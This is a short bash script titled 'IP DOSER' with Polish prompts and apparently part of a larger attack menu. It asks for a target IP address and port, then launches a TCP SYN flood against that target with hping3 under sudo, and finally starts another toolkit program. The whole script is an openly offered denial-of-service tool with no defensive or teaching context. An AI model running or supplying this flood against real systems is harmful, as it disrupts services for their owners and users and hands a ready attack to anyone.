#! /bin/bash
echo "
    ________     ____  ____  _____ __________ 
   /  _/ __ \   / __ \/ __ \/ ___// ____/ __ \
   / // /_/ /  / / / / / / /\__ \/ __/ / /_/ /
 _/ // ____/  / /_/ / /_/ /___/ / /___/ _, _/ 
/___/_/      /_____/\____//____/_____/_/ |_|  
                                              
"
echo "Podaj adres IP celu: "
read IP
echo "Podaj port celu: "
read PORT
sudo hping3 -S --flood -V -p $PORT $IP
cd ..
sudo ./K0Z1OLMENU

